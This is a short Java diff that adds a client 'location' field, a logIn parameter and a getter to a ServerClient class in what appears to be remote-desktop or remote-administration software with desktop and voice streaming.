@@ -6,7 +6,7 @@ final class ServerClient {
 	
 	private boolean loggedIn;
 	
-	private String name, os, version;
+	private String name, location, os, version;
 	private boolean streamingDesktop, streamingVoice;
 	
 	public final ActiveConnection connection;
@@ -20,8 +20,9 @@ final class ServerClient {
 		fileTree = new FileTree();
 	}
 	
-	public void logIn(final String name, final String os, final String version) {
+	public void logIn(final String name, final String location, final String os, final String version) {
 		this.name = name;
+		this.location = location;
 		this.os = os;
 		this.version = version;
 		
@@ -53,6 +54,10 @@ final class ServerClient {
 	
 	public String getName() {
 		return name;
+	}
+	
+	public String getLocation() {
+		return location;
 	}
 	
 	public String getAddress() {
